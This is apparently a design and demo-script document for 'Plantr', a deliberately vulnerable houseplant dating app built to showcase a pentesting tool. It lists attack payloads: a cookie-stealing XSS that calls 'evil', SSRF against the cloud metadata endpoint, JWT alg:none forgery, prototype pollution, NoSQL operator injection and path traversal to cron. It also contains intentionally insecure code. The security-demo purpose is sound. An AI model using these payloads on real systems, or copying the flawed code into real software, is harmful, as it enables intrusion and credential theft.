# Plantr — Swipe Right for Photosynthesis

> Tinder for houseplants. Match your monstera with someone else's monstera. Cross-pollinate, message, share light meter readings, fall in chlorophyll.

A demo target for **Pensar Apex**: a real-time matching app with photo uploads, chat, and an "import plant from URL" feature. The premise is silly (your pothos is lonely). The bugs are not.

---

## Premise & Vibe

Plantr is the dating app your fiddle-leaf fig has been quietly hoping for. Owners post profiles for each plant in their collection — species, light preferences, leaf count, last repot date, a flirty bio, and three glamour shots. The recommendation engine surfaces botanically compatible matches (same genus, opposite chromosome count, complementary bloom seasons). Owners swipe right; on a mutual match a real-time chat opens so the humans can coordinate a pollen handoff. There is also an `Import from URL` feature that scrapes a plant's profile from a competitor "leaf book," because the founder believes data portability is a human right.

The vibe is consumer mobile: pastel gradients, haptic-feeling animations on the web build, push notifications on the native build. Engineering velocity has prioritized cute over correct. The Mongoose schemas are loose, the Socket.IO handlers were copy-pasted from a tutorial in 2021, and the multipart upload handler was hand-rolled because "multer felt like overkill for one screen." Every one of those decisions has consequences.

The recording angle: Apex walks in, sees the swipe API, and within ten minutes is reading `/etc/passwd` from a Kali shell because someone named a plant photo `../../../etc/cron.d/pwn`.

---

## Why This Stack

- **Node 22 + Express 5**: realistic for 2025/2026 startups. Express 5 changed async error handling; teams migrating from 4 often leave subtle middleware ordering bugs (perfect for the WebSocket auth bypass).
- **MongoDB + Mongoose**: documents with arbitrary shape, plus a query layer that happily accepts operator objects. The canonical NoSQL injection surface.
- **Socket.IO**: the de-facto real-time choice in the JS ecosystem. Authentication patterns vary wildly between teams; many only check the token at handshake and trust the connection forever after. That asymmetry is the entire point of the WS abuse demo.
- **React Native (Expo) with web build**: lets the demo show both a phone screen recording and a desktop browser exploit (the stored XSS only fires on the web build because RN native renderers don't execute HTML). Two surfaces, one bug.
- **Hand-rolled multipart parser**: most apps use `multer`. Plantr uses a 60-line parser the founder wrote on a flight. This is unfortunately not unrealistic — see [the recurring class of multipart filename traversal CVEs](https://www.offsec.com/blog/cve-2024-13059/) where filename sanitization is the missing piece.

The stack is small enough to build in 3-5 days and broad enough to hit nine of Apex's signature finding classes.

---

## Stack Details

| Layer | Choice | Version | Notes |
|---|---|---|---|
| Runtime | Node.js | 22 LTS | Native fetch used in SSRF sink |
| HTTP framework | Express | 5.0.x | Async error propagation differs from v4 |
| Database | MongoDB | 7.0 | Single replica set, no field-level encryption |
| ODM | Mongoose | 8.x | `strict: false` on `Plant` schema (intentional) |
| Real-time | Socket.IO | 4.7 | Server-side, no Redis adapter |
| Auth | jsonwebtoken | 8.5.1 | Pinned old on purpose; vulnerable to alg confusion patterns ([CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)) |
| Mobile | Expo | SDK 50 | `expo export:web` produces the vulnerable web build |
| Image storage | Local filesystem | `./uploads/plants/<plantId>/` | Served via `express.static` |
| Rate limit | `express-rate-limit` | 7.x | Per-IP only, intentionally weak |
| Utility | Hand-written `deepMerge` | n/a | Vulnerable like [lodash CVE-2019-10744](https://nvd.nist.gov/vuln/detail/cve-2019-10744) |
| URL fetcher | Native `fetch` | n/a | No allowlist, no IP filter |

Containerized with a two-service `docker-compose.yml` (api, mongo) and a `kali` sidecar that Apex's `executeCommand` can target during the path-traversal demo.

---

## Architecture

```
+-----------------------------+         +---------------------+
|  React Native (Expo) app    |  HTTPS  |  Express 5 API      |
|  - swipe deck               |<------->|  /api/*             |
|  - chat screen              |  WSS    |  /socket.io/*       |
|  - upload sheet             |<------->|  Socket.IO server   |
|  - "Import from URL"        |         |  custom multipart   |
+-----------------------------+         |  handler            |
                                        +----------+----------+
                                                   |
                            +----------------------+----------------------+
                            |                      |                      |
                      +-----v-----+         +------v------+         +-----v-----+
                      |  MongoDB  |         |  ./uploads/ |         | outbound  |
                      |  plants   |         |  plants/<id>|         |  fetch    |
                      |  users    |         |  /*.jpg     |         |  (SSRF)   |
                      |  matches  |         +-------------+         +-----------+
                      |  messages |
                      +-----------+
```

Single Express app handles REST and Socket.IO on the same HTTP server (`server.listen`). JWT verification is wired as Express middleware for `/api/*` and as Socket.IO `io.use(...)` middleware for the handshake — but **not** inside per-event handlers. That asymmetry is the WebSocket auth-bypass anchor bug.

Uploads write to `./uploads/plants/<plantId>/<filename>` where `filename` is taken from the multipart `Content-Disposition: filename=` header, decoded but not normalized. The directory is served by `express.static('./uploads')`, so anything written under the project root that ends up under `./uploads` after path resolution is also publicly readable.

---

## Data Model

### `users`
```js
{
  _id: ObjectId,
  email: String,            // unique, indexed
  passwordHash: String,     // bcrypt(12)
  displayName: String,
  bio: String,
  createdAt: Date,
  // pollution sink: deepMerge'd from PATCH /api/users/:id body
  preferences: {
    notifyOnMatch: Boolean,
    radiusKm: Number,
    isAdmin: Boolean        // <-- never sent by client; pollution flips it
  }
}
```

### `plants` (Mongoose `strict: false`)
```js
{
  _id: ObjectId,
  ownerId: ObjectId,        // ref users
  species: String,          // "Monstera deliciosa"
  genus: String,            // indexed for matching
  bio: String,              // <-- rendered raw on web build (XSS)
  photos: [String],         // public URLs under /uploads/plants/<id>/
  light: String,            // "bright-indirect" | "low" | "direct"
  bloomMonth: Number,
  chromosomeCount: Number,
  // matching uses these directly with operator passthrough
  visibility: String,       // "public" | "private"
  createdAt: Date
}
```

### `matches`
```js
{
  _id: ObjectId,
  plantA: ObjectId,
  plantB: ObjectId,
  ownerA: ObjectId,
  ownerB: ObjectId,
  roomId: String,           // used for Socket.IO room join
  createdAt: Date
}
```

### `messages`
```js
{
  _id: ObjectId,
  roomId: String,
  senderId: ObjectId,
  body: String,
  createdAt: Date
}
```

### `likes`
```js
{
  _id: ObjectId,
  userId: ObjectId,         // who swiped
  plantId: ObjectId,        // what they liked
  direction: "right" | "left",
  createdAt: Date
}
```

---

## Key Routes / Surfaces (REST + Socket.IO events)

### REST

| Method | Path | Auth | Purpose | Notes |
|---|---|---|---|---|
| POST | `/api/signup` | none | create account | bcrypt cost 12 |
| POST | `/api/login` | none | issue JWT | weak per-IP rate limit |
| GET | `/api/me` | JWT | current user | |
| PATCH | `/api/users/:id` | JWT | update profile/preferences | **deepMerge'd** into user doc |
| GET | `/api/users/:id/likes` | JWT | list user's right-swipes | **no ownership check** |
| POST | `/api/plants` | JWT | create plant profile | |
| GET | `/api/plants/:id` | JWT | view plant | |
| POST | `/api/plants/:id/photos` | JWT | multipart photo upload | hand-rolled parser |
| POST | `/api/plants/import` | JWT | import plant from URL | **fetch user-supplied URL server-side** |
| GET | `/api/match` | JWT | candidate plants for swiping | **operator passthrough** in filter |
| POST | `/api/swipe` | JWT | record swipe; create match if mutual | |
| GET | `/api/matches` | JWT | my matches | |
| GET | `/api/matches/:id/messages` | JWT | message history | |

### Socket.IO events

| Event | Direction | Auth check | Purpose | Notes |
|---|---|---|---|---|
| `connection` | C->S | handshake JWT (`io.use`) | establish | only place token is verified |
| `chat:join` | C->S | **none after handshake** | join `room:<roomId>` | no membership check |
| `chat:send` | C->S | **none after handshake** | broadcast message in room | no sender == room-member check |
| `chat:typing` | C->S | none | typing indicator | trivially spoofable |
| `match:new` | S->C | n/a | server pushes new match | sent to `user:<userId>` room |
| `presence:update` | C->S | **none** | set my presence string | written to in-memory map keyed by client-supplied `userId` (impersonation) |
| `admin:broadcast` | C->S | role check **only on connection.user.isAdmin** | server-wide announcement | role read from token claims set during handshake; not re-checked, not re-fetched |

---

## Auth Model

- Email + password signup. Password hashed with bcrypt cost 12.
- Login returns a JWT (HS256 nominally) with claims `{ sub, email, isAdmin, iat, exp }`.
- Express middleware `requireAuth` calls `jwt.verify(token, SECRET)` with **no `algorithms` option**. This is the well-documented `alg: none` acceptance class ([CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235), still common in homegrown auth code). `jsonwebtoken` 8.5.1 will accept `"alg":"none"` tokens unless `algorithms` is explicitly passed.
- Socket.IO handshake reads `socket.handshake.auth.token`, runs the same `jwt.verify`, and stores `socket.data.user` for the connection lifetime. **Per-event handlers never re-validate or re-authorize.**
- Refresh tokens: none. JWT TTL 7 days.
- CORS: `cors({ origin: (o, cb) => cb(null, o), credentials: true })` — origin reflected, credentials allowed. Classic [PortSwigger CORS exploitation pattern](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties).

---

## Intentional Vulnerabilities (>=10)

| # | Severity | Class | Location | Trigger | Real-world parallel |
|---|---|---|---|---|---|
| V1 | Critical | Image-upload path traversal -> RCE | `POST /api/plants/:id/photos` (custom multipart parser) | `Content-Disposition: filename="../../../../etc/cron.d/plantr"` | [CVE-2024-13059 AnythingLLM path traversal RCE](https://www.offsec.com/blog/cve-2024-13059/) |
| V2 | Critical | NoSQL injection (operator passthrough) | `GET /api/match?genus[$ne]=null&visibility[$where]=...` | Express's default query parser builds nested objects from bracket notation; passed straight into `Plant.find()` | [PortSwigger NoSQL injection lab](https://portswigger.net/web-security/nosql-injection); recurring HackerOne class |
| V3 | Critical | JWT `alg: none` accepted | `requireAuth` middleware, Socket.IO handshake | Forge token with `{"alg":"none","typ":"JWT"}` and `isAdmin: true` claim | [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) |
| V4 | Critical | Prototype pollution -> privilege escalation | `PATCH /api/users/:id` -> `deepMerge(userDoc, body)` | `{"preferences": {"__proto__": {"isAdmin": true}}}` or `{"constructor": {"prototype": {"isAdmin": true}}}` | [CVE-2019-10744 lodash defaultsDeep](https://nvd.nist.gov/vuln/detail/cve-2019-10744) |
| V5 | High | WebSocket per-event auth bypass | `chat:join`, `chat:send`, `presence:update` | After valid handshake, emit `chat:join` with arbitrary `roomId`; read every match's chat | Common Socket.IO anti-pattern ([WebSocket vulnerabilities overview](https://deepstrike.io/blog/mastering-websockets-vulnerabilities)) |
| V6 | High | SSRF in import-from-URL | `POST /api/plants/import` body `{"url": "..."}` | `fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")` | [HackerOne $25k SSRF in Analytics PDF generator](https://osintteam.blog/25-000-ssrf-in-hackerones-analytics-reports-b9a5b3aa3d6e); [LarkSuite Wiki import SSRF](https://sirleeroyjenkins.medium.com/bypassing-ssrf-protection-to-exfiltrate-aws-metadata-from-larksuite-bf99a3599462) |
| V7 | High | IDOR on liked-plants list | `GET /api/users/:id/likes` | Auth required but `:id` not compared to `req.user.sub` | [Bugcrowd IDOR primer](https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/); HackerOne IDOR top class |
| V8 | High | CORS misconfig (reflected origin + credentials) | global `cors()` middleware | Attacker page reads `/api/me` and `/api/matches` with victim cookies/JWT | [PortSwigger CORS exploitation](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties) |
| V9 | High | Stored XSS in plant bio (web build) | React Native Web renders `bio` via `dangerouslySetInnerHTML` for "rich text" | `<img src=x onerror="fetch('//evil/?'+document.cookie)">` | OWASP A03; classic dating-profile XSS pattern |
| V10 | Medium | Weak rate limit on `/api/login` | `express-rate-limit` keyed only on `req.ip` | User-enumeration loop from a single IP at 60 req/min/user-target by rotating `email` while staying under the IP cap; or trivially bypassed by rotating IPs | OWASP ASVS V11.1.4; common bounty class |
| V11 | Medium | Weak admin gating via stale JWT claim | `admin:broadcast` checks `socket.data.user.isAdmin` at event time, but claim was set at handshake from token | Combine with V3 or V4: forged/escalated user keeps WS open and broadcasts | Token-vs-state drift, common in long-lived WS sessions |
| V12 | Low | Open redirect after login | `GET /api/login/callback?next=` | `next=//evil.example` reflected in 302 | Phishing helper, OWASP A01 |
| V13 | Low | Sensitive info in error responses | Mongoose validation errors leak schema paths and DB names | `POST /api/plants` with malformed payload | OWASP A05 |

---

## Real-World Parallels

- **NoSQL injection** in Mongoose-backed APIs is a perennial bounty earner; the operator-passthrough variant (where Express's `qs` parser turns `?genus[$ne]=null` into `{$ne: null}`) is documented in every NoSQL injection cheat sheet ([PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md), [PortSwigger Web Security Academy](https://portswigger.net/web-security/nosql-injection)).
- **JWT `alg: none`** is the canonical homegrown-auth bug ([CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)) and continues to ship in production code that calls `jwt.verify` without an `algorithms` option.
- **Prototype pollution via deepMerge** mirrors [CVE-2019-10744](https://nvd.nist.gov/vuln/detail/cve-2019-10744) (lodash `defaultsDeep`) and the more recent [CVE-2024-38986](https://gist.github.com/mestrtee/b20c3aee8bea16e1863933778da6e4cb) in `@75lb/deep-merge`.
- **Multipart filename path traversal -> RCE** matches [CVE-2024-13059 (AnythingLLM)](https://www.offsec.com/blog/cve-2024-13059/) and the broader pattern of trusting `Content-Disposition: filename` directly. Many startups still hand-roll multipart parsing.
- **SSRF in import-from-URL** mirrors LarkSuite Wiki, GitLab project import ($10k bounty), and the [$25k HackerOne Analytics SSRF](https://osintteam.blog/25-000-ssrf-in-hackerones-analytics-reports-b9a5b3aa3d6e). AWS IMDSv1 is still reachable on plenty of misconfigured EC2 instances.
- **CORS reflected-origin + credentials** is documented in [PortSwigger's "Exploiting CORS misconfigurations for bitcoins and bounties"](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties); five-figure payouts on Shopify and Dropbox.
- **WebSocket per-event auth gap**: discussed in [the Socket.IO authentication issue thread](https://github.com/socketio/socket.io/issues/4899) and exemplified across consumer chat apps that only validate at handshake.
- **IDOR on user-scoped resources**: [HackerOne data shows ~200 IDOR reports/month](https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/); list endpoints keyed on `:id` are top offenders.

---

## Apex Features Showcased

This demo is built specifically to anchor:

1. **NoSQL injection class detection** — Apex's `/pentest` should flag `/api/match` after a small fuzzing pass. The judge should explain operator passthrough and produce a CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H finding.
2. **Real-time WebSocket abuse** — `/operator` walkthrough where the swarm establishes a Socket.IO connection with a low-priv account, then enumerates room IDs and reads cross-tenant chat.
3. **Image-upload path traversal exploited via Apex's `executeCommand` in Kali** — Apex finds the traversal, drops a payload, then SSHes to the Kali sidecar via `executeCommand` to demonstrate the resulting shell. This is the headline showcase for the Kali integration.
4. **Patching agent** — after findings land, the patching agent rewrites:
   - `requireAuth` to pass `algorithms: ['HS256']`
   - the multipart handler to call `path.basename` and reject filenames with `..` or NUL bytes
   - the `/api/match` query builder to use a strict allowlist
   - `deepMerge` to drop `__proto__` and `constructor` keys
   - per-event Socket.IO middleware
5. **Memory** — Apex remembers across runs that Plantr's `/api/plants/import` is SSRF-prone, and on a re-run goes straight for `169.254.169.254`.
6. **JS endpoint extraction** — Apex's static pass on the Expo web bundle pulls `/api/users/:id/likes` even though the swipe UI never displays it; this is how the IDOR is found.
7. **Threat model** — pre-test, Apex generates a STRIDE-style model from the README and `routes/` directory and predicts NoSQL injection on `/api/match` and SSRF on `/api/plants/import` before sending a single packet.
8. **Attack-surface mapping** — Apex spots the public `/uploads` directory and probes it after the path traversal lands.
9. **Playwright** — drives the Expo web build to trigger the stored-XSS payload and capture the cookie exfil callback in network logs.
10. **TUI + headless** — record both modes; show the same finding rendered in the TUI's findings pane and dumped as JSON via headless.

---

## Demo Storyline

A 12-minute screen recording, split across three acts.

**Act I — Sniff (0:00–3:30).** Open the Expo web build at `http://plantr.local`. Show the swipe deck, an upload, a match, a chat. Open Apex's TUI, run `apex threat-model ./repo`. Apex predicts NoSQL injection on `/api/match`, SSRF on `/api/plants/import`, and "WS auth: handshake-only." On-screen: the threat model panel.

**Act II — Strike (3:30–9:00).**

1. `apex /pentest http://plantr.local` with a low-priv test account.
2. Swarm finds **V2 (NoSQL injection)** in 90 seconds. Apex shows the request `GET /api/match?genus[$ne]=null` returning every plant in the database, including private ones.
3. Pivot to **V3 (JWT alg:none)**. Apex forges `isAdmin: true` token, hits `/api/me`, gets admin context.
4. **V1 (path-traversal upload)**. Apex crafts a multipart with `filename="../../../../tmp/plantr_pwn.sh"`, then a second upload with `filename="../../../../etc/cron.d/plantr"` containing a one-liner. Cut to Apex's `executeCommand` against the `kali` sidecar, SSH to the API container's exposed mount, `cat /tmp/plantr_pwn.sh`, run it, get a shell. **Headline moment.**
5. **V6 (SSRF)** as a quick follow-up: `POST /api/plants/import {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/PlantrEC2Role"}`, dump credentials.
6. Open the chat screen in a second browser and show **V5**: Apex's WS client emits `chat:join` with another user's `roomId`, reads private messages.

**Act III — Patch (9:00–12:00).** Run the patching agent. It opens 5 PRs (one per critical/high). Re-run `/pentest`; previously red findings turn green. End on the findings dashboard with five fixed and the remaining mediums/lows triaged.

---

## Build Notes

**Day 1 — Scaffolding.**
- `npm init`, Express 5, Mongoose, Socket.IO, jsonwebtoken@8.5.1.
- Auth: signup/login, JWT (HS256), `requireAuth` middleware **without `algorithms` option** (V3).
- CORS configured to reflect origin with credentials (V8).
- Mongo schemas: `User`, `Plant` (`strict: false`), `Match`, `Message`, `Like`. Seed script with 200 plants, 50 users.

**Day 2 — Core features.**
- Swipe deck: `GET /api/match` builds query as
  ```js
  const q = { visibility: 'public', _id: { $nin: alreadySwiped } };
  if (req.query.genus) q.genus = req.query.genus;       // V2
  if (req.query.light) q.light = req.query.light;       // V2
  if (req.query.species) q.species = req.query.species; // V2
  return Plant.find(q).limit(20);
  ```
  Express default `qs` parser turns `?genus[$ne]=null` into `{ genus: { $ne: null } }`.
- `POST /api/swipe`, mutual-match detection creates `Match` doc with deterministic `roomId = sha1(plantA+plantB)`.
- `GET /api/users/:id/likes`: requires JWT but does **not** compare `:id` to `req.user.sub` (V7).
- `PATCH /api/users/:id` uses hand-rolled `deepMerge(existing, req.body)` (V4). Implementation:
  ```js
  function deepMerge(target, source) {
    for (const key of Object.keys(source)) {
      if (typeof source[key] === 'object' && source[key] !== null) {
        target[key] = target[key] || {};
        deepMerge(target[key], source[key]);
      } else {
        target[key] = source[key];
      }
    }
    return target;
  }
  ```
  No `__proto__` / `constructor` filter.

**Day 3 — Uploads + import.**
- Hand-rolled multipart parser. ~60 LOC. Reads boundary, splits parts, parses headers, writes file body to `path.join('./uploads/plants', plantId, parsedFilename)`. **No `path.basename`, no `..` rejection** (V1).
- `/uploads` exposed via `app.use('/uploads', express.static('./uploads'))`.
- `POST /api/plants/import`: server-side `await fetch(req.body.url)`, parses HTML, populates plant. No URL allowlist, no IP filter, no DNS rebind protection (V6). Use Node 22 native `fetch`.
- `bio` field rendered with `dangerouslySetInnerHTML` in the React Native Web build for "rich text" (V9). Native build uses plain `Text` so doesn't fire — emphasize the cross-platform asymmetry on screen.

**Day 4 — Real-time + Expo.**
- Socket.IO server. `io.use(handshakeAuth)` reads `socket.handshake.auth.token`, populates `socket.data.user`. **No per-event middleware** (V5/V11).
- Handlers `chat:join`, `chat:send`, `presence:update`, `admin:broadcast`. Persist messages to Mongo. Emit `match:new` to `user:<id>` room from `/api/swipe` on mutual match.
- Expo app: swipe deck, plant detail, match list, chat. `expo export:web` produces the static web bundle. Wire the API base URL via env.

**Day 5 — Polish + container.**
- `docker-compose.yml`: api, mongo, kali (ubuntu+openssh+nmap, mounted to api's `./uploads`).
- Seed an "AWS-looking" mock IMDS at `http://169.254-mock.plantr.local` (or run a tiny mock server bound on the api container) so V6 has something convincing to dump.
- Login rate limit (V10): `rateLimit({ windowMs: 60_000, max: 60, keyGenerator: r => r.ip })`.
- Error middleware leaks Mongoose errors verbatim (V13). Open redirect on `/api/login/callback?next=` (V12).
- README with the silly premise and a `SECURITY.md` that says "we take security very seriously" (it's funnier).

**Don'ts.**
- Don't use `multer`. The hand-rolled parser is the point.
- Don't pin `jsonwebtoken` to a fixed-version. Use 8.5.1 and the missing `algorithms` option.
- Don't put a real allowlist on `fetch`. Comment `// TODO: SSRF guard` next to the call. The TODO is canon.

---

## Recording Notes

- Resolution 1920x1200, 60fps, two-pane: Apex TUI on left, target browser/terminal on right.
- Use a real Tinder-ish color palette in the Expo web build (peach to mint gradient). The aesthetic delta between cute UI and Kali shell is the joke.
- Pre-stage three plant accounts with photos: a monstera named "Steve," a pothos named "Greg," and a snake plant named "Linda, esq."
- For Act II step 4, split the screen three ways briefly: Apex finding card, the multipart request body with the `..` filename highlighted, and the Kali shell catching the connect-back. Pause for 3 seconds on the prompt.
- Add a single sound cue (a leaf rustle) when a finding lands at Critical. No other audio bed.
- End card: "Plantr — bring your own pollen. Pensar Apex — bring your own findings."
- Caption track must include the CVE numbers as they're referenced ([CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235), [CVE-2019-10744](https://nvd.nist.gov/vuln/detail/cve-2019-10744), [CVE-2024-13059](https://www.offsec.com/blog/cve-2024-13059/)) for the social cut-down.
- Save the patching-agent diff view as a still for the thumbnail.
